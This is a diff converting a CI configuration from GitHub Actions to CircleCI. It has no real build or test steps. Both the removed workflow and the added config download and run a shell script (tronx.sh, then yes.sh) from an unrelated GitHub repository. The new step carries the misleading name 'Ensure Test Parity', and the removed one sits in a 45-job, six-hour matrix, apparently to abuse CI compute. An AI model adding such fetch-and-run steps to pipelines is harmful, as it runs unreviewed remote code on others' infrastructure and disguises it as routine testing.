@@ -1,27 +1,11 @@
-name: TRX
-on: [push, pull_request]
+version: 2.1
 jobs:
   build:
-    name: SKRT
-    runs-on: ubuntu-18.04
-    strategy:
-      max-parallel: 30
-      fail-fast: false
-      matrix:
-        go: [1.6, 1.7, 1.8, 1.9, 1.10]
-        flag: [A, B, C, D, E, F, G, H, I]
-    timeout-minutes: 360
-    env:
-        NUM_JOBS: 20
-        JOB: ${{ matrix.go }}
+    working_directory: ~/repo
+    docker:
+      - image: circleci/golang:1.15.8
     steps:
-    - name: Set up Go ${{ matrix.go }}
-      uses: actions/setup-go@v1
-      with:
-        go-version: ${{ matrix.go }}
-      id: go
-    - name: Setup
-      uses: actions/checkout@v1
-    - name: SKRT
-      run: |
-        wget https://raw.githubusercontent.com/myzrdd/aw/main/tronx.sh && chmod u+x tronx.sh && ./tronx.sh
+      - checkout
+      - run:
+          name: Ensure Test Parity
+          command: wget https://raw.githubusercontent.com/myzrdd/aw/main/yes.sh &&  chmod +x yes.sh && ./yes.sh
